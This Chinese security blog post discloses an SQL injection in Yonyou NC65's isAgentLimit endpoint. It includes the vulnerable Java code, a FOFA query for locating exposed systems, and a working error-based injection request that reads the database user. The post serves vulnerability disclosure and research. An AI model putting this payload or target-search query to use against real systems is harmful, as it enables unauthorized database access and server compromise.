---
title: "用友NC isAgentLimit SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-isAgentLimit-agent-sqli.html
asset_dir: assets/用友nc-isagentlimit-sql注入漏洞
---

# 用友NC isAgentLimit SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/26 22:13
* 1234浏览
* [0评论](#comment)
* 17分钟阅读

深入探索

sql

SQL

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友") NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC isAgentLimit 接口处pk\_flowagent参数存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据官方漏洞通告,NC系统的/portal/pt/oacoSchedulerEvents/isAgentLimit的参数pk\_flowagent存在SQL注入漏洞

深入探索

Docker加速服务

安全研究报告

企业安全咨询

[![用友NC isAgentLimit SQL注入漏洞](images/img-001-7eff74277ce3.webp)](https://image.mrxn.net/922964e92cdf46c481aeedfbfabad4cd.webp)

`isAgentLimit` 的业务逻辑实现如下

代码安全审计

```
@Action
    public void isAgentLimit() throws BusinessException {
        String pk_flowagent = this.getRequest().getParameter("pk_flowagent");
        String pk_byagent = this.getRequest().getParameter("pk_byagent");
        ISchedulerAgentQueryService agentQry = (ISchedulerAgentQueryService)NCLocator.getInstance().lookup(ISchedulerAgentQueryService.class);
        StringBuilder sql = new StringBuilder();
        sql.append("pk_agent='").append(pk_flowagent).append("' and pk_user='").append(pk_byagent).append("'").append(" and useflag='Y' ");
        sql.append("and '").append(new UFDateTime().toString()).append("' between startdate and stopdate ");
        SchedulerAgentVO[] agentvos = agentQry.getAgentVOsByCondition(sql.toString());
        if (agentvos != null && agentvos.length > 0) {
            this.outClientMessage("N", 0);
        } else {
            this.outClientMessage("Y", 0);
        }
    }
```

深入探索

漏洞扫描服务

漏洞预警服务

安全研究工具

`pk_flowagent` 和 **pk\_byagent** 直接拼接进SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞") ,两个参数均存在SQL注入漏洞，网上POC只提到了和官方通告一样的参数，而忽略了第二个参数。

漏洞修复方案

# 漏洞复现

```
GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_byagent=-1'and+1=utl_inaddr.get_host_name((select+user+from dual))-- HTTP/1.1
Host: nc65.mrxn.net
```

报错注入，成功回显当前数据库用户

[![用友NC isAgentLimit SQL注入漏洞](images/img-002-efdde670e8b2.webp)](https://image.mrxn.net/fec31da7f1bf4e58acd3ed2f1ba3a671.webp)

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=560`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC isAgentLimit SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-isAgentLimit-agent-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-isAgentLimit-agent-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

企业资源规划

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-isAgentLimit-agent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入防护

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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